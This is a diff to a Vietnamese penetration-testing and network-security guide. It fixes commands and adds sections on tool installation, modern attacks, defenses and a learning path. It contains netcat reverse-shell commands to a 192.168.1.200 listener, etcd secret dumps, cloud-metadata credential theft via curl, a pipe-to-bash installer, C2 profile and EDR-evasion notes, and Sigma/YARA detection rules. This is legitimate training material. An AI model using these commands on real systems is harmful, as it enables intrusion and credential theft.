@@ -77,6 +77,12 @@
 - [PHẦN 38: TOOL REFERENCE DEEP DIVE](#phần-38-tool-reference-deep-dive) — Recon, Enumeration, Post-exploitation, Wireless tools (full command reference)
 - [PHẦN 39: CVE DEEP DIVES](#phần-39-cve-deep-dives) — EternalBlue, Heartbleed, Log4Shell, Shellshock, ProxyLogon/ProxyShell
 - [PHẦN 40: MOBILE APP NETWORK TESTING](#phần-40-mobile-app-network-testing) — Android/iOS proxy, Certificate pinning bypass, Frida
+- [PHẦN 41: TOOL INSTALL GUIDE](#phần-41-tool-install-guide) — Cài đặt tất cả tools trong guide
+
+**Modern Attacks (2024-2025):**
+- [PHẦN 42: MODERN ATTACKS](#phần-42-modern-attacks-2024-2025) — HTTP/2 Rapid Reset, CONTINUATION flood, Supply Chain, 5G, AI attacks, EDR evasion, K8s, Cobalt Strike signatures
+- [PHẦN 43: DEFENSE ADDITIONS](#phần-43-defense-additions) — Defense cho Wireless, Kerberos/AD, API attacks
+- [PHẦN 44: CROSS-REFERENCES & LEARNING PATH](#phần-44-cross-references--learning-path) — Cross-reference map, Learning path, Cheat sheet, Resources
 
 ---
 
@@ -987,7 +993,7 @@ nmap -sn 192.168.1.0/24
 # ARP scan (chỉ trong LAN, chính xác nhất)
 nmap -PR -sn 192.168.1.0/24
 
-# TCP SYN ping (port 443 mặc định)
+# TCP SYN ping (-PS mặc định port 80, ở đây chỉ định port 443)
 nmap -PS443 -sn 192.168.1.0/24
 
 # TCP ACK ping
@@ -1143,7 +1149,9 @@ masscan 192.168.1.0/24 -p80,443 --rate=1000 -oL results.txt
 
 # Kết hợp với nmap
 masscan 10.0.0.0/8 -p80,443 --rate=10000 -oL open_hosts.txt
-# Rồi nmap -sV -sC -iL open_hosts.txt
+# Parse masscan output → nmap input (masscan format khác nmap -iL)
+grep '^open' open_hosts.txt | awk '{print $4}' | sort -u > nmap_targets.txt
+nmap -sV -sC -iL nmap_targets.txt
 ```
 
 ## 3.3 Netcat (nc) - Swiss Army Knife
@@ -1160,9 +1168,11 @@ nc -znv 192.168.1.100 1-1000
 # Listener (chờ kết nối)
 nc -lvnp 4444
 
-# Connect back (reverse shell)
+# Connect back (reverse shell) — cần ncat (nmap) hoặc nc.traditional, KHÔNG dùng nc.openbsd
+# Install: sudo apt install ncat  HOẶC  sudo apt install netcat-traditional
 nc 192.168.1.200 4444 -e /bin/bash      # Linux
 nc 192.168.1.200 4444 -e cmd.exe        # Windows
+# Nếu không có -e, dùng mkfifo: xem Phần 20
 
 # File transfer
 # Bên nhận:
@@ -1305,8 +1315,8 @@ Tại sao nguy hiểm:
 - Can redirect email (MX record), web, any service
 
 Defense:
-- Source port randomization (DNSSEC)
-- DNSSEC validation (cryptographic proof of DNS records)
+- Source port randomization (tăng entropy, khó guess TxID + port)
+- DNSSEC validation (cryptographic proof of DNS records — biện pháp riêng biệt)
 - DNS over HTTPS (DoH) / DNS over TLS (DoT)
 
 ┌─────────┐  "random123.target.com?"   ┌──────────┐
@@ -1388,8 +1398,8 @@ yersinia dtp -attack 1 -interface eth0
 
 # Thủ công với Linux (thêm VLAN interface)
 modprobe 8021q
-vconfig add eth0 200              # Thêm VLAN 200
-ifconfig eth0.200 up
+ip link add link eth0 name eth0.200 type vlan id 200   # vconfig đã deprecated
+ip link set eth0.200 up
 dhclient eth0.200                 # Lấy IP từ VLAN 200
 ```
 
@@ -2595,8 +2605,8 @@ nmap -sI zombie:80 192.168.1.100
 # SYN scan giả source port 80
 hping3 -S -p 445 -s 80 192.168.1.100
 
-# Xmas scan
-hping3 -F -S -R -P -A -U -p 80 192.168.1.100
+# Xmas scan (FIN + PSH + URG)
+hping3 -F -P -U -p 80 192.168.1.100
 
 # === Tunneling qua allowed ports ===
 # HTTP tunnel (port 80/443 thường cho phép)
@@ -2688,7 +2698,7 @@ Standards:
 802.11g  →  2.4GHz, 54 Mbps
 802.11n  →  2.4/5GHz, 600 Mbps   (Wi-Fi 4)
 802.11ac →  5GHz,   6.9 Gbps    (Wi-Fi 5)
-802.11ax →  2.4/5/6GHz, 9.6 Gbps (Wi-Fi 6)
+802.11ax →  2.4/5GHz, 9.6 Gbps   (Wi-Fi 6)  — 6GHz = Wi-Fi 6E
 
 Security protocols:
 WEP     → Broken, KHÔNG BAO GIỜ dùng
@@ -2872,7 +2882,7 @@ def syn_scan(target, ports):
             results[port] = "open"
             # Send RST to close
             send(IP(dst=target) / TCP(dport=port, flags="R"), verbose=False)
-        elif resp and resp[TCP].flags == 0x14:  # RST
+        elif resp and resp[TCP].flags == 0x14:  # RST-ACK
             results[port] = "closed"
         else:
             results[port] = "filtered"
@@ -3113,11 +3123,12 @@ fake_router6 eth0              # Fake router advertisement
 parasite6 eth0                 # ARP spoofing equivalent for IPv6
 redir6 eth0                    # Redirect traffic
 
-# IPv6 MITM
+# IPv6 MITM (dùng NDP spoofing, KHÔNG phải ARP — ARP chỉ có trong IPv4)
 sudo bettercap
 > set net.sniff.local true
 > net.probe on
-> set arp.spoof.targets fe80::1
+> set ndp.spoof.targets fe80::1
+> ndp.spoof on
 ```
 
 ## 9.6 Network Automation & Scripting
@@ -3488,58 +3499,6 @@ Phase 5: Reporting
 
 ---
 
-# TỔNG KẾT & RESOURCES
-
-## Cheat Sheet nhanh
-
-```
-Discover hosts     → nmap -sn 192.168.1.0/24
-Scan ports         → nmap -sS -sV -sC -p- target
-Web enum           → gobuster/ffuf/nikto
-Exploit search     → searchsploit service_version
-MITM               → bettercap (arp.spoof + net.sniff)
-Password attack    → hydra / crackmapexec
-Pivot              → ssh -D 1080 / chisel / ligolo-ng
-Proxy traffic      → proxychains + socks5
-Capture traffic    → tcpdump -i eth0 -w cap.pcap / Wireshark
-Firewall           → iptables -A INPUT -p tcp --dport 22 -j ACCEPT
-```
-
-## Resources
-
-```
-Books:
-- "The TCP/IP Guide" by Charles M. Kozierok (Bible of networking)
-- "Hacking: The Art of Exploitation" by Jon Erickson
-- "Penetration Testing" by Georgia Weidman
-- "Red Team Field Manual" (RTFM)
-- "The Hacker Playbook 3" by Peter Kim
-- "Network Security Assessment" by Chris McNab
-
-Online:
-- TryHackMe: https://tryhackme.com
-- HackTheBox: https://hackthebox.com
-- OverTheWire: https://overthewire.org (Bandit → Natas → ...)
-- PentesterLab: https://pentesterlab.com
-- CyberDefenders: https://cyberdefenders.org (Blue team)
-- VulnHub: https://vulnhub.com
-
-YouTube:
-- NetworkChuck
-- David Bombal
-- IppSec (HackTheBox walkthroughs)
-- John Hammond
-- The Cyber Mentor
-
-Tools Documentation:
-- Nmap: https://nmap.org/book/
-- Wireshark: https://www.wireshark.org/docs/
-- Metasploit: https://docs.metasploit.com/
-- Burp Suite: https://portswigger.net/web-security
-```
-
----
-
 # PHẦN 11: ROUTING & SWITCHING NÂNG CAO
 
 ## 11.1 TCP/IP Model vs OSI Model
@@ -3876,7 +3835,7 @@ SMTP Session:
 
 Ports:
   25  → SMTP (server-to-server relay)
-  465 → SMTPS (implicit TLS, deprecated)
+  465 → SMTPS (implicit TLS, re-standardized RFC 8314/2018)
   587 → Submission (client-to-server, STARTTLS)
 ```
 
@@ -5322,57 +5281,6 @@ Exfiltration:
 # 2. Gap analysis: Technique nào chưa có detection
 # 3. Threat modeling: Threat actor dùng technique nào
 # 4. Purple team: Red team tấn công theo ATT&CK, blue team detect
-```
-
----
-
-# TỔNG KẾT CUỐI CÙNG
-
-## Network Learning Path (Thứ tự học)
-
-```
-Level 1 - Foundations (Tuần 1-4):
-  □ OSI Model + TCP/IP Model
-  □ IP addressing + Subnetting
-  □ TCP/UDP + Handshakes
-  □ DNS, DHCP, ARP
-  □ Basic tools: ping, traceroute, netstat, nmap
-  □ Lab: Dựng VirtualBox + Kali + Metasploitable
-
-Level 2 - Intermediate (Tuần 5-8):
-  □ Wireshark + tcpdump deep dive
-  □ HTTP/HTTPS + TLS
-  □ Routing & Switching (VLAN, STP, OSPF)
-  □ Firewall (iptables/nftables)
-  □ Nmap advanced (NSE scripts)
-  □ Lab: TryHackMe Network rooms
-
-Level 3 - Offensive (Tuần 9-14):
-  □ MITM attacks (ARP, DNS, SSL strip)
-  □ Password attacks (Hydra, CrackMapExec)
-  □ Responder + NTLM relay
-  □ Network scanning methodology
-  □ Burp Suite / Charles Proxy
-  □ Lab: HackTheBox Easy machines
-
-Level 4 - Red Team (Tuần 15-20):
-  □ Pivoting (SSH, Chisel, Ligolo-ng)
-  □ Tunneling (DNS, ICMP, HTTP)
-  □ Lateral Movement (PtH, PtT, WinRM)
-  □ Kerberos attacks
-  □ C2 Frameworks (Sliver)
-  □ Lab: HackTheBox Pro Labs (Dante, Offshore)
-
-Level 5 - Expert (Tuần 21+):
-  □ Cloud networking (AWS/Azure)
-  □ Container/K8s networking
-  □ Zero Trust architecture
-  □ BGP/OSPF attacks
-  □ Advanced evasion
-  □ DDoS mitigation
-  □ SIEM + threat detection
-  □ eBPF security
-  □ Cert: OSCP → CRTO → OSEP
 ```
 
 # PHẦN 25: FUNDAMENTALS BỔ SUNG
@@ -7136,7 +7044,7 @@ Event ID   Log           Ý nghĩa
 4732       Security      User added to local group
 4768       Security      Kerberos TGT requested (AS-REQ)
 4769       Security      Kerberos service ticket requested (TGS-REQ) → Kerberoasting
-4771       Security      Kerberos pre-authentication failed → AS-REP Roasting
+4771       Security      Kerberos pre-authentication failed → Brute force indicator
 4776       Security      NTLM authentication (credential validation)
 5140       Security      Network share accessed
 5145       Security      Detailed file share access
@@ -7170,8 +7078,9 @@ Sigma rule:
     selection:
       EventID: 4769
       TicketEncryptionType: '0x17'
-      ServiceName|endswith: '$'    # exclude machine accounts
-    condition: selection | count(ServiceName) by TargetUserName > 5
+    filter:
+      ServiceName|endswith: '$'    # machine accounts (loại trừ)
+    condition: selection and not filter | count(ServiceName) by TargetUserName > 5
     timeframe: 1h
 
 === AS-REP Roasting Detection ===
@@ -8214,6 +8123,593 @@ frida -U -f com.target.app -l ios_ssl_bypass.js
 # Cycript (runtime manipulation)
 # Frida
 # Objection
+```
+
+---
+
+# PHẦN 41: TOOL INSTALL GUIDE
+
+> Tất cả tools trong guide — cách cài đặt đầy đủ.
+
+## 41.1 Network Attack Tools
+
+```bash
+# === Core tools (Kali đã có sẵn, distro khác cần cài) ===
+sudo apt install nmap masscan netcat-traditional ncat
+sudo apt install dsniff              # arpspoof, macof, filesnarf
+sudo apt install ettercap-text-only  # MITM framework
+sudo apt install bettercap           # Modern MITM (hoặc: go install github.com/bettercap/bettercap@latest)
+sudo apt install yersinia            # L2 attacks (DHCP, DTP, STP)
+sudo apt install hydra               # Password brute force
+sudo apt install hping3              # Packet crafting
+sudo apt install responder           # LLMNR/NBT-NS poisoning
+sudo apt install sslstrip            # SSL stripping (cần Python 2 — prefer bettercap thay thế)
+
+# === Wireless ===
+sudo apt install aircrack-ng         # WPA/WPA2 cracking suite
+sudo apt install hcxdumptool hcxtools  # PMKID capture
+sudo apt install kismet              # Wireless IDS
+
+# === Scapy ===
+pip3 install scapy
+# Trong Scapy, toán tử / ghép layers: IP()/TCP() = IP packet chứa TCP segment
+
+# === Impacket (AD/SMB/Kerberos tools) ===
+pip3 install impacket
+# Bao gồm: psexec.py, wmiexec.py, smbexec.py, secretsdump.py,
+# GetUserSPNs.py, GetNPUsers.py, ntlmrelayx.py, smbserver.py
+
+# === BloodHound (AD attack path) ===
+pip3 install bloodhound                      # Python collector
+sudo apt install neo4j                       # Graph database (required)
+# BloodHound GUI: download từ https://github.com/BloodHoundAD/BloodHound/releases
+# Hoặc BloodHound CE: docker compose up
+
+# === Chisel (TCP tunneling) ===
+# Download binary từ: https://github.com/jpillora/chisel/releases
+# Hoặc: go install github.com/jpillora/chisel@latest
+
+# === Ligolo-ng (Modern tunneling) ===
+# Download proxy + agent từ: https://github.com/nicocha30/ligolo-ng/releases
+# Cần cả ligolo-proxy (attacker) VÀ ligolo-agent (target)
+
+# === DNS tunneling ===
+sudo apt install iodine               # DNS tunnel
+# dnscat2:
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server && gem install bundler && bundle install  # Server
+cd dnscat2/client && make                                    # Client
+
+# === SSL testing ===
+git clone https://github.com/drwetter/testssl.sh.git
+# Hoặc: sudo apt install testssl.sh
+
+# === Scanning alternatives ===
+cargo install rustscan                 # Fast port scanner (cần nmap)
+pip3 install autorecon                 # Automated recon pipeline
+
+# === Vulnerability scanner ===
+# OpenVAS/GVM (Kali):
+sudo apt install gvm && sudo gvm-setup && sudo gvm-start
+# Distro khác: dùng Docker: docker run -d -p 9392:9392 greenbone/gsad
+# CLI: gvm-cli (thay thế cho omp đã deprecated)
+
+# === Exploit scripts ===
+# ZeroLogon tester: git clone https://github.com/SecuraBV/CVE-2020-1472.git
+# PrintNightmare: git clone https://github.com/cube0x0/CVE-2021-1675.git
+# krbrelayx/dnstool: pip3 install krbrelayx
+```
+
+## 41.2 C2 Frameworks
+
+```bash
+# === Sliver ===
+# Download từ GitHub releases (recommend):
+# https://github.com/BishopFox/sliver/releases
+# Hoặc: curl https://sliver.sh/install | sudo bash
+# (Verify script trước khi pipe to bash)
+
+# === Havoc ===
+# Prerequisites (nhiều dependencies!):
+sudo apt install -y git build-essential cmake libfontconfig1 libglib2.0-0 \
+  libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev \
+  libssl-dev libreadline-dev libffi-dev libsqlite3-dev mesa-common-dev \
+  qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 \
+  libqt5websockets5-dev qtdeclarative5-dev golang-go nasm
+git clone https://github.com/HavocFramework/Havoc.git
+cd Havoc/teamserver && go build
+cd ../client && make
+```
+
+---
+
+# PHẦN 42: MODERN ATTACKS (2024-2025)
+
+## 42.1 HTTP/2 Rapid Reset (CVE-2023-44487)
+
+```
+Năm: 2023 | Impact: Largest DDoS ever — 398M requests/sec (Google)
+
+Nguyên lý:
+HTTP/2 cho phép multiplexing — nhiều streams trong 1 TCP connection.
+Attacker mở stream → gửi RST_STREAM ngay lập tức → server vẫn phải process
+→ Lặp lại hàng triệu lần/giây
+
+Tại sao nguy hiểm:
+- 1 TCP connection = hàng nghìn requests (không cần nhiều IP)
+- Server phải allocate resources cho mỗi stream trước khi RST
+- Bypass rate limiting truyền thống (dựa trên connection count)
+
+┌────────┐  Stream 1: GET /     ┌────────┐
+│ Attack │ ───────────────────> │ Server │  (allocate resources)
+│        │  RST_STREAM 1        │        │  (free, but too late)
+│        │ ───────────────────> │        │
+│        │  Stream 2: GET /     │        │  (allocate again)
+│        │ ───────────────────> │        │
+│        │  RST_STREAM 2        │        │
+│        │ ───────────────────> │        │  ... x 1,000,000/sec
+└────────┘                      └────────┘
+
+Defense:
+- Limit concurrent streams per connection (SETTINGS_MAX_CONCURRENT_STREAMS)
+- Rate limit RST_STREAM frames
+- Update web server (nginx ≥ 1.25.3, Apache ≥ 2.4.58)
+- CDN/DDoS protection (Cloudflare, AWS Shield)
+```
+
+## 42.2 HTTP/2 CONTINUATION Flood (CVE-2024-27316)
+
+```
+Năm: 2024 | Affects: Apache, Node.js, Go, nghttp2
+
+Nguyên lý:
+HTTP/2 HEADERS frame có thể split thành nhiều CONTINUATION frames
+(khi header quá lớn, dùng CONTINUATION để gửi tiếp)
+BUG: Server PHẢI buffer TẤT CẢ CONTINUATION frames cho đến khi
+nhận được END_HEADERS flag
+Attacker gửi CONTINUATION frames KHÔNG BAO GIỜ kết thúc
+→ Server buffer grows → memory exhaustion → crash
+
+Defense:
+- Limit total HEADERS size
+- Timeout HEADERS without END_HEADERS
+- Patch: Apache 2.4.59+, Node.js 18.20+/20.12+
+```
+
+## 42.3 Supply Chain Attacks via Network
+
+```bash
+# === Dependency Confusion ===
+# Nguyên lý (Alex Birsan, 2021):
+# Company dùng internal package "company-utils" trên private registry
+# Attacker publish "company-utils" version 999.0.0 trên public npm/PyPI
+# Build system ưu tiên version cao hơn → download malicious package!
+
+# Detection:
+# npm: .npmrc → registry=https://private.registry.com
+# pip: --index-url https://private.pypi.com --extra-index-url https://pypi.org
+# → extra-index-url VẪN vulnerable!
+
+# === Typosquatting ===
+# Publish packages với tên gần giống popular packages:
+# requests → requets, reqeusts
+# lodash → lodahs, l0dash
+
+# Defense:
+# Pin exact versions trong lock files
+# Use private registry exclusively
+# Verify package signatures
+# Monitor for new packages matching internal names
+```
+
+## 42.4 5G Network Security
+
+```
+5G Architecture (vs 4G):
+┌─────────────────────────────────────────────────┐
+│ 5G Core (SBA - Service-Based Architecture)      │
+│ ┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐       │
+│ │ AMF │ │ SMF │ │ UPF │ │ AUSF│ │ UDM │       │
+│ │(Access│(Session│(User │(Auth)│(Data)│       │
+│ │Mgmt)  │Mgmt)  │Plane)│     │     │       │
+│ └─────┘ └─────┘ └─────┘ └─────┘ └─────┘       │
+│ HTTP/2 APIs giữa các NFs (thay thế GTP-C)      │
+└─────────────────────────────────────────────────┘
+
+New attack surfaces:
+1. Network Slicing: Mỗi "slice" là virtual network riêng
+   → Slice isolation bypass = access other tenants
+2. SUCI/SUPI: 5G encrypt subscriber identity (fix IMSI catching)
+   → Nhưng initial attach vẫn leak thông tin
+3. HTTP/2 API between NFs: RESTful → traditional web attacks apply
+4. Edge Computing (MEC): Compute at cell tower level
+   → New attack surface gần user hơn
+5. GTP (GPRS Tunneling): Vẫn dùng trong 5G NSA (Non-Standalone)
+   → Legacy GTP attacks still work
+
+Tools:
+- SUPI catcher: Upgraded IMSI catchers cho 5G
+- 5GC API testing: Standard REST API tools (Burp, Postman)
+- Open5GS: Open-source 5G core cho lab testing
+```
+
+## 42.5 AI-Powered Attacks & Defenses
+
+```
+=== Offensive AI ===
+1. AI-generated phishing: LLMs tạo email phishing cực kỳ convincing
+   - Personalized based on OSINT
+   - Multiple languages, perfect grammar
+   - Voice cloning cho vishing attacks
+
+2. ML-based IDS evasion:
+   - Adversarial packets: Modify traffic patterns to evade ML classifiers
+   - GAN-generated network traffic mimicking legitimate patterns
+   - Automated payload mutation
+
+3. AI-assisted exploitation:
+   - Automated vulnerability discovery
+   - Smart fuzzing với ML feedback loops
+   - Auto-generate exploit payloads
+
+=== Defensive AI ===
+1. ML Anomaly Detection:
+   - Supervised: Train on labeled normal/attack traffic
+   - Unsupervised: Detect deviations from baseline (Isolation Forest, Autoencoders)
+   - Tools: Elastic ML, Splunk MLTK, Darktrace
+
+2. LLM for Threat Analysis:
+   - Auto-triage SIEM alerts
+   - Natural language query over security logs
+   - Automated incident response playbooks
+
+3. AI-based Network Traffic Analysis:
+   - Encrypted traffic classification (without decryption)
+   - C2 beacon detection via timing pattern analysis
+   - DGA (Domain Generation Algorithm) domain detection
+```
+
+## 42.6 EDR/XDR Evasion (Network Perspective)
+
+```bash
+# === JA3/JA3S Fingerprinting ===
+# TLS Client Hello có fingerprint unique cho mỗi tool
+# Default Cobalt Strike/Sliver/Metasploit = known JA3 hashes
+
+# Evasion: Customize TLS fingerprint
+# Cobalt Strike: Malleable C2 profile
+set sleeptime "30000";
+set jitter "20";
+http-get {
+    set uri "/api/v1/status";
+    client {
+        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
+        header "Accept" "application/json";
+    }
+}
+
+# === Domain Fronting ===
+# Gửi HTTPS request đến CDN (allowed domain)
+# Host header thực tế trỏ đến C2 server
+# CDN forward request → bypass firewall/proxy rules
+# Cloudflare, Azure CDN đã block; một số CDN khác vẫn vulnerable
+
+# === ETW Patching ===
+# Patch ETW (Event Tracing for Windows) để blind Sysmon/EDR
+# Sysmon dựa vào ETW events → patch EtwEventWrite → Sysmon mù
+# Không phải network-specific nhưng ảnh hưởng network detection
+
+# === Direct Syscalls ===
+# Bypass user-mode API hooks (EDR hook ntdll.dll)
+# Call syscalls directly → EDR không thấy network calls
+# Tools: SysWhispers3, HellsGate, Halo's Gate
+```
+
+## 42.7 Kubernetes Advanced Attacks
+
+```bash
+# === RBAC Bypass ===
+# Check current permissions
+kubectl auth can-i --list
+# Overly permissive ClusterRole → escalate to cluster-admin
+
+# === etcd Unauthenticated Access ===
+# etcd chứa ALL cluster secrets (unencrypted by default)
+# Nếu etcd exposed (port 2379):
+etcdctl --endpoints=http://etcd-ip:2379 get / --prefix --keys-only
+etcdctl --endpoints=http://etcd-ip:2379 get /registry/secrets/default/
+
+# === Pod → Cloud Metadata ===
+# Từ bên trong pod, access cloud metadata:
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# → Steal cloud credentials nếu không có network policy block
+
+# === Service Mesh Attacks (Istio) ===
+# mTLS bypass: Nếu Istio permissive mode → plaintext vẫn accepted
+# Sidecar injection: Inject malicious sidecar → intercept all pod traffic
+# Control plane: Compromise istiod → control all service mesh policies
+
+# === Container Escape via Network ===
+# CVE-2024-21626 (Leaky Vessels / runc):
+# Exploit file descriptor leak → escape container
+# Network impact: Escaped container = access host network namespace
+
+# Defense:
+# NetworkPolicy restrict pod-to-pod
+# PodSecurityPolicy / Pod Security Standards
+# Encrypt etcd at rest
+# Block metadata endpoint via NetworkPolicy
+```
+
+## 42.8 Cobalt Strike Network Signatures
+
+```bash
+# === Default Indicators (easy to detect) ===
+# Default JA3: 72a589da586844d7f0818ce684948eea
+# Default HTTP GET beacon: /pixel, /submit.php, /__utm.gif
+# Default named pipe: \\.\pipe\msagent_*
+# Default user-agent: "Mozilla/5.0 (compatible; MSIE 9.0...)"
+# Beacon interval: Every 60s with 0% jitter
+
+# === Malleable C2 Profile Structure ===
+# http-get: Defines GET request format for beacon check-in
+# http-post: Defines POST request format for data exfil
+# http-stager: Defines initial payload download format
+# Customize: URIs, headers, user-agent, body encoding
+
+# === Detection (Blue Team) ===
+# Sigma rule: Cobalt Strike default named pipes
+title: Cobalt Strike Named Pipe
+detection:
+  selection:
+    EventID: 17    # Sysmon: Pipe Created
+    PipeName|startswith:
+      - '\msagent_'
+      - '\MSSE-'
+      - '\postex_'
+      - '\status_'
+
+# YARA for network capture:
+rule CobaltStrike_Beacon_Config {
+    strings:
+        $s1 = { 00 01 00 01 00 02 ?? ?? 00 02 00 01 00 02 ?? ?? }
+    condition:
+        $s1
+}
+
+# JA3 detection (Suricata):
+# alert tls any any -> any any (ja3.hash; content:"72a589da586844d7f0818ce684948eea"; sid:1;)
+```
+
+---
+
+# PHẦN 43: DEFENSE ADDITIONS
+
+> Phòng thủ cho các attack techniques chưa có defense section.
+
+## 43.1 Wireless Attack Defenses
+
+```bash
+# === WPA Cracking Defense ===
+# Dùng WPA3 nếu devices hỗ trợ
+# Password > 12 ký tự, mix case + numbers + special
+# Enable 802.11w (PMF - Protected Management Frames)
+# Disable WPS (vulnerable to brute force)
+# RADIUS/802.1X cho enterprise (thay vì PSK)
+
+# === Evil Twin Defense ===
+# 802.1X authentication (certificate-based)
+# Wireless IDS (Kismet, Aruba RFProtect)
+# Educate users: Verify network before connecting
+# MDM policy: Auto-connect only to known SSIDs
+
+# === Bluetooth Defense ===
+# Disable Bluetooth khi không dùng
+# Non-discoverable mode
+# Reject unknown pairing requests
+# Update firmware (BLE vulnerabilities patched regularly)
+```
+
+## 43.2 Kerberos & AD Attack Defenses
+
+```bash
+# === Kerberoasting Defense ===
+# Service account passwords > 25 ký tự (random)
+# Group Managed Service Accounts (gMSA) — auto-rotate password
+# Monitor Event 4769 với RC4 encryption (Phần 34)
+# Disable RC4: GPO → Network Security: Configure encryption types
+
+# === AS-REP Roasting Defense ===
+# KHÔNG disable Kerberos pre-authentication cho bất kỳ user nào
+# Audit: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
+
+# === Golden Ticket Defense ===
+# Reset krbtgt password 2 LẦN (old + new) — mỗi 180 ngày
+# Monitor for TGTs with abnormal lifetime
+# Privileged Access Workstations (PAW) cho Domain Admins
+
+# === DCSync Defense ===
+# Chỉ Domain Controllers mới có Replication rights
+# Monitor Event 4662 cho non-DC replication requests (Phần 34)
+# Remove unnecessary Replicating Directory Changes permissions
+
+# === General AD Hardening ===
+# Tiered admin model (Tier 0/1/2)
+# LAPS (Local Admin Password Solution) — random local admin passwords
+# Credential Guard (protect LSASS from memory dumping)
+# Protected Users group (disable NTLM, delegation, long-term keys)
+# AdminSDHolder monitoring
+
+# === PrintNightmare / PetitPotam Defense ===
+# Disable Print Spooler trên DCs: Stop-Service Spooler; Set-Service Spooler -StartupType Disabled
+# EPA (Extended Protection for Authentication) trên ADCS
+# Disable NTLM where possible
+```
+
+## 43.3 API Attack Defenses
+
+```bash
+# === JWT Defense ===
+# KHÔNG accept "alg: none"
+# Validate alg header against whitelist
+# Use RS256 (asymmetric) thay HS256 cho public APIs
+# Short expiration time (15 min)
+# Implement token revocation (blacklist)
+
+# === GraphQL Defense ===
+# Disable introspection in production
+# Query depth limiting (max 5-7 levels)
+# Query complexity analysis
+# Rate limiting per query, not per request
+# Field-level authorization
+
+# === SSRF Defense ===
+# Whitelist allowed URLs/IPs for server-side requests
+# Block private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x)
+# Disable HTTP redirects in server-side requests
+# Use metadata service v2 (IMDSv2) — requires PUT token
+
+# === CORS Defense ===
+# KHÔNG reflect Origin header blindly
+# Whitelist specific origins
+# Avoid Access-Control-Allow-Origin: *  với credentials
+# Validate Origin server-side, not just via CORS headers
+
+# === HTTP Smuggling Defense ===
+# Normalize Content-Length vs Transfer-Encoding handling
+# Reject ambiguous requests
+# Use HTTP/2 end-to-end (no downgrade)
+# WAF rules for smuggling patterns
+```
+
+---
+
+# PHẦN 44: CROSS-REFERENCES & LEARNING PATH
+
+## 44.1 Cross-Reference Map
+
+```
+Topic                          Primary    Related Sections
+───────────────────────────    ────────   ─────────────────────────
+ARP Spoofing/MITM              Phần 4.1   → Phần 34 (detection), Phần 9.1 (Scapy)
+DNS Attacks                    Phần 4.1   → Phần 29.3 (DNSSEC/DoH), Phần 37.2 (CTF pcap)
+Firewall Evasion               Phần 7.7   → Phần 3.1 (nmap evasion)
+Wireless                       Phần 8     → Phần 27.2 (advanced wireless), Phần 38.5
+SSL/TLS                        Phần 9.2   → Phần 40.2 (cert pinning bypass)
+Kerberos                       Phần 14    → Phần 26 (AD attacks), Phần 34 (detection)
+Cloud                          Phần 17    → Phần 30 (advanced), Phần 42.7 (K8s)
+Monitoring                     Phần 18    → Phần 31, Phần 34 (detection signatures)
+Pivoting                       Phần 5.1   → Phần 35 (attack chains)
+C2 Frameworks                  Phần 5.4   → Phần 42.6 (EDR evasion), Phần 42.8 (CS sigs)
+IPv6                           Phần 25.4  → Phần 9.5 (IPv6 attacks), Phần 42.4 (5G)
+```
+
+## 44.2 Network Learning Path
+
+```
+Level 1 — Foundations (Tuần 1-4):
+  □ OSI Model + TCP/IP Model (Phần 1)
+  □ IP addressing + Subnetting (Phần 1, 25.1)
+  □ TCP/UDP + Handshakes (Phần 1, 25.3)
+  □ DNS, DHCP, ARP (Phần 1)
+  □ Basic tools: ping, traceroute, netstat, nmap (Phần 2, 3)
+  □ Lab: Dựng VirtualBox + Kali + Metasploitable (Phần 10)
+
+Level 2 — Intermediate (Tuần 5-8):
+  □ Wireshark + tcpdump deep dive (Phần 2)
+  □ HTTP/HTTPS + TLS (Phần 1, 9.2)
+  □ Routing & Switching (VLAN, STP, OSPF) (Phần 11)
+  □ Firewall (iptables/nftables) (Phần 7, 33)
+  □ Nmap advanced (NSE scripts) (Phần 3)
+  □ Lab: TryHackMe Network rooms
+
+Level 3 — Offensive (Tuần 9-14):
+  □ MITM attacks (ARP, DNS, SSL strip) (Phần 4)
+  □ Password attacks (Hydra, CrackMapExec) (Phần 4.5)
+  □ Responder + NTLM relay (Phần 4.6, 26.4)
+  □ Proxy: Burp Suite / Charles (Phần 6)
+  □ API Security + Bug Bounty (Phần 36)
+  □ Lab: HackTheBox Easy machines
+
+Level 4 — Red Team (Tuần 15-20):
+  □ Pivoting (SSH, Chisel, Ligolo-ng) (Phần 5.1)
+  □ Tunneling (DNS, ICMP, HTTP) (Phần 5.3)
+  □ Lateral Movement (PtH, PtT, WinRM) (Phần 5.2)
+  □ Kerberos + AD attacks (Phần 14, 26)
+  □ C2 Frameworks (Phần 5.4)
+  □ Complete Attack Chains (Phần 35)
+  □ Lab: HackTheBox Pro Labs (Dante, Offshore)
+
+Level 5 — Expert (Tuần 21+):
+  □ Cloud networking + K8s (Phần 17, 30, 42.7)
+  □ Blue Team detection (Phần 34)
+  □ EDR evasion + modern attacks (Phần 42)
+  □ eBPF security (Phần 23)
+  □ 5G / IoT security (Phần 42.4, 21)
+  □ Cert: OSCP → CRTO → OSEP
+
+What's Next — Beyond Network Security:
+  → Web Application Security: OWASP Top 10, Burp Suite mastery
+  → Binary Exploitation: Stack overflow, ROP, heap exploitation
+  → Malware Analysis: Static + dynamic analysis, reverse engineering
+  → Cloud Security: AWS/Azure/GCP pentesting certifications
+  → Threat Intelligence: MITRE ATT&CK mapping, threat hunting
+```
+
+## 44.3 Cheat Sheet
+
+```
+Discover hosts     → nmap -sn 192.168.1.0/24
+Scan ports         → nmap -sS -sV -sC -p- target
+Web enum           → gobuster/ffuf/nikto
+Exploit search     → searchsploit service_version
+MITM               → bettercap (arp.spoof + net.sniff)
+Password attack    → hydra / netexec (nxc)
+Pivot              → ssh -D 1080 / chisel / ligolo-ng
+Proxy traffic      → proxychains + socks5
+Capture traffic    → tcpdump -i eth0 -w cap.pcap / Wireshark
+Firewall           → iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+AD enum            → bloodhound-python / PowerView
+Kerberoast         → GetUserSPNs.py / Rubeus kerberoast
+Credential dump    → mimikatz / secretsdump.py
+Lateral move       → psexec.py / evil-winrm / wmiexec.py
+C2                 → sliver / havoc
